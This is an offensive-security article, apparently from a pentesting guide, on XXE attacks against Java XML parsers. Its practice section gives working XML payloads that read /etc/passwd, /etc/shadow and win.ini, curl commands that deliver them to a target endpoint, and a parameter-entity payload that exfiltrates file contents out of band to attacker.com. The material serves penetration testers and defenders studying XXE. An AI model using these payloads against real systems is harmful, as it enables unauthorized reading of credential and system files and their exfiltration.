---
title: Understanding Java XML Parser Exploitation
description: Explore Java XML Parser XXE vulnerabilities, attack vectors, and mitigation
  techniques against SAXParser, DocumentBuilder, Xerces, and JAXP.
keywords:
- Java XML parser
- XXE vulnerabilities
- SAXParser
- DocumentBuilder
- Xerces
- JAXP
- XXE attack
- XML exploitation
- Java security
---

# Java XML Parser Exploitation

## Context

This article focuses on exploiting XML External Entity (XXE) vulnerabilities specifically in Java XML parsers. It covers various Java parser implementations such as SAXParser, DocumentBuilder, Xerces, and JAXP. The instruction caters to offensive operators seeking to craft attacks that utilize parser-specific behaviors, enabling them to bypass common mitigation strategies.

Assumed knowledge includes a solid understanding of XML parsing fundamentals, entity resolution mechanisms, Java Security Manager concepts, and general XXE exploitation techniques.

## Theory

### Java XML Parser Landscape and XXE Exposure

Java XML parsers, such as SAXParser, DocumentBuilder, DOM, Xerces, and JAXP APIs, play a pivotal role in XML data processing. The configuration of these parsers primarily determines their vulnerability to XXE attacks. When not properly configured, Java XML parsers may allow external entity expansion, leading to potential XXE exploitation. This vulnerability model revolves around the improper mishandling of entity resolution settings, resulting in unauthorized access to system resources through crafted XML input.

### Parser-Specific XXE Attack Vectors

Each Java XML parser offers unique attack sequences based on their configuration settings:

- **SAXParser**: Exploitation occurs through unprotected instances of javax.xml.parsers.SAXParserFactory, permitting external entity injection.
- **DocumentBuilder**: Vulnerabilities arise from insecure configurations within DocumentBuilderFactory, allowing XXE attacks.
- **Xerces**: The Apache Xerces parser can be exploited when default settings facilitate entity expansion.
- **JAXP**: When Java API for XML Processing operates with secure processing disabled, XXE vulnerabilities are exposed.

### Java XML Parser Configuration and Prevention Bypass

Many developers mistakenly assume that disabling Document Type Definitions (DTDs) or external entities comprehensively mitigates XXE vulnerabilities. However, some mitigations may only block SYSTEM entities, leaving parameter or internal entities vulnerable. Furthermore, legacy or custom parser wrappers might inadvertently re-enable insecure features, thus providing potential bypass avenues for attackers.

### Attacker Opportunities and Threat Surface

Applications often trust XML input from untrusted sources, posing significant risks. XXE payloads can exploit this trust to access local files, environment variables, and internal network resources. Moreover, due to protocol weaknesses, Java parsers may erroneously fetch remote resources through file://, http://, or ftp:// schemes, enabling further exploitation vectors.

## Practice

### SAXParser XXE Exploitation (javax.xml.parsers.SAXParserFactory)

- **Craft an XML Payload**: 
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <foo>&xxe;</foo>
  ```
  This XML defines an external entity referencing a local file.

- **Execute the Exploit**:
  ```bash
  curl -X POST -H "Content-Type: application/xml" --data-binary @xxe.xml http://target-app/upload
  ```
  Send the malicious XML to a vulnerable entry point using SAXParser.

**Outcome**: The attacker retrieves the contents of /etc/passwd, demonstrating sensitive data access via XXE in SAXParser.

### DocumentBuilder XXE Exploitation (javax.xml.parsers.DocumentBuilderFactory)

- **Prepare an XXE Payload**:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
  <foo>&xxe;</foo>
  ```
  This payload is designed to target a file on a Windows system through an external entity.

- **Deliver the Payload**:
  ```bash
  curl -X POST -H "Content-Type: application/xml" --data-binary @xxe_win.xml http://target-app/upload
  ```
  Attack delivery is attempted via the DocumentBuilder interface.

**Outcome**: Successful XXE attack results in unauthorized access to the targeted Windows configuration file.

### Xerces XXE Exploitation (org.apache.xerces.parsers.SAXParser)

- **Design a Parameter Entity XXE for OOB Exfiltration**:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>"> %eval; %exfiltrate; ]>
  <foo>bar</foo>
  ```
  This XML uses parameter entities to facilitate out-of-band data exfiltration.

- **Execute with a Network Exfiltration Trigger**:
  ```bash
  curl -X POST -H "Content-Type: application/xml" --data-binary @xxe_oob.xml http://target-app/upload
  ```
  The crafted payload triggers exfiltration via a vulnerable Xerces parser.

**Outcome**: The sensitive file is stealthily exfiltrated to an attacker-controlled server.

### JAXP XXE Prevention Bypass

- **Test for Secure Processing Disablement**:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
  <foo>&xxe;</foo>
  ```
  This payload is used to check if JAXP's secure processing feature has been disabled.

- **Deploy the Test Payload**:
  ```bash
  curl -X POST -H "Content-Type: application/xml" --data-binary @xxe_shadow.xml http://target-app/upload
  ```
  Initiate the payload aimed at exploiting JAXP vulnerabilities.

**Outcome**: If JAXP's secure processing was not enforced, unauthorized access to /etc/shadow is possible.

## Tools

- **curl**
- **Burp Suite**
- **XXEinjector**